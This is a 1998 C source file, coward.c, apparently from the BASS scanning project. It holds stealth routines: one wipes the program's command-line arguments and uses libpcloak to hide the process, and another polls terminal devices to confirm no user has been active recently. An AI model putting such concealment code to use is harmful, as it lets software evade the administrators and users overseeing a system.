/*

coward.c

Author: Liraz Siri <liraz@bigfoot.com>

Copyright (c) 1998 Liraz Siri <liraz@bigfoot.com>, Ariel, Israel,
              All rights reserved.

Created: Sun Nov 15 19:13:04 IST 1998

cowardness routines:
* system activity auditer.
* libpcloak interface.
* mask.

*/

#include "BASS.h"
#ifdef HAS_PCLOAK
#include <pcloak.h>
#endif
#include "coward.h"

/* activate pcloak stealth */
void coward_init(int argc, char **argv)
{
 int i;

 /* destroy the argument table */
 for(i = 0; i<argc; i++)
  memset(argv[i], 0, strlen(argv[i]));

#ifdef HAS_PCLOAK
 pcloak_init(COWARDNESS_DEFAULT_OPTIONS);
 pcloak_unregister();
#endif
}

/* audit for terminal activity */
int coward_coastclear(void)
{
 struct stat dummy;
 const char *cpa, *cpb;

 const char tty[] = "/dev/tty";
 const char pty[] = "pqrS";
 const char order[] = "0123456789abcdef";
 char filename[strlen(tty) + 3];

 strcpy(filename, tty);
 filename[strlen(tty) + 1] = '\0';

/* check console terminals */
 for(cpa = order; *cpa; cpa++) {
  filename[strlen(tty)] = *cpa;
  if( stat(filename, &dummy) < 0 ) continue;
  if( (time(NULL) - dummy.st_atime) < COWARDNESS_COASTCLEAR_SECS ) return 0;
 }

/* check non-consoles */
 filename[strlen(tty) + 2] = '\0';
 for(cpa = pty; *cpa; cpa++) {
  filename[strlen(tty)] = *cpa;
  for(cpb = order; *cpb; cpb++) {
   filename[strlen(tty) + 1] = *cpb;
   if( stat(filename, &dummy) < 0 ) continue;
   if( (time(NULL) - dummy.st_atime) < COWARDNESS_COASTCLEAR_SECS ) return 0;
  }
 }

 return 1;
}

